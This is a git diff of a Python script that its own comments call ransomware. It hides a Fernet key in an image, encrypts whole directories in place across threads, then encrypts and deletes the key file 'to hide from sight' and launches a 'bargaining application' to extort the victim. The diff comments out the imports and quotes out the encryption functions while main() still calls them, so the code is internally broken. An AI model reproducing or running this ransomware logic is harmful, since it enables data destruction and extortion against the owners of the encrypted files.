@@ -1,18 +1,16 @@
 #import os
-from cryptography.fernet import Fernet
-from concurrent.futures import ThreadPoolExecutor
-from extract import extract_message
+#from cryptography.fernet import Fernet
+#from concurrent.futures import ThreadPoolExecutor
+#from extract import extract_message
 
 
-def encrypt_file(filename: str, key: str):
+'''def encrypt_file(filename: str, f_key: Fernet):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
-    :param key: Represents the key to be converted to an instance of Fernet object.
+    :param f_key: Represents an instance of the Fernet Class created with a key.
     :return: None
     """
-    # Converts that key to a Fernet object to gain access to Fernet methods
-    f_key: Fernet = Fernet(key)
     # Assigns the data inside the unencrypted file to a variable
     with open(filename, "rb") as unencrypted_file:
         plaintext = unencrypted_file.read()
@@ -20,14 +18,14 @@ def encrypt_file(filename: str, key: str):
     ciphertext = f_key.encrypt(plaintext)
     # Overwrites the same file
     with open(filename, "wb") as encrypted_file:
-        encrypted_file.write(ciphertext)
+        encrypted_file.write(ciphertext)'''
 
 
-def process_directory(directory: str, key: str, blacklist: list[str]):
+'''def process_directory(directory: str, f_key: Fernet, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files encrypted.
-    :param key: Represents the key to be converted to an instance of Fernet object.
+    :param f_key: Represents an instance of the Fernet Class created with a key.
     :param blacklist:
     :return: None
     """
@@ -41,8 +39,8 @@ def process_directory(directory: str, key: str, blacklist: list[str]):
                 # Combines the path of the directory with the file name to create filepath of file
                 file_path = os.path.join(root, file)
                 # Encrypts the file given the newly generated filepath
-                encrypt_file(file_path, key)
-                print(file)
+                encrypt_file(file_path, f_key)
+                print(file)'''
 
 
 
@@ -51,21 +49,28 @@ def main():
     # TODO: Update the name of the images as needed
     image_containing_key: str = "download.jpg"
 
-    if os.path.exists(image_containing_key):
-        pass
-    else:
-        raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
-                                f"Either the name fed to the variable in the code to be updated or the image "
-                                f"specified just doesn't exist.")
+    try:
+        if os.path.exists(image_containing_key):
+            pass
+        else:
+            raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
+                                    f"Either the name fed to the variable in the code to be updated or the image "
+                                    f"specified just doesn't exist.")
+    except FileNotFoundError as fnfe:
+        print(f"File Not Found: {fnfe}")
+        return
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        return
 
     key: str = extract_message(image_containing_key, "Mochi")
+    # Converts that key to a Fernet object to gain access to Fernet methods
+    f_key: Fernet = Fernet(key)
 
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
     # TODO: Verify, but SHOULD prevent the code from encrypting itself
     blacklist: list[str] = [os.getcwd()]
-
-    encrypt_file("encrypted_file.txt", key)
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
@@ -79,13 +84,17 @@ def main():
     # Start a thread for each directory
     with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
         # Submit each directory to be processed in a separate thread
-        futures = [executor.submit(process_directory, directory, key, blacklist) for directory in
+        futures = [executor.submit(process_directory, directory, f_key, blacklist) for directory in
                    directories_to_encrypt]
         # Ensure each thread completes by calling `.result()` on each future
         for future in futures:
             future.result()
 
     print("Encryption successful!")
+
+    # Encrypts and removes the key from the working directory to hide from sight
+    encrypt_file("key.txt", f_key)
+    os.remove("key.txt")
 
     # Runs the bargaining application
     if os.path.exists("bargain_with_user.py"):
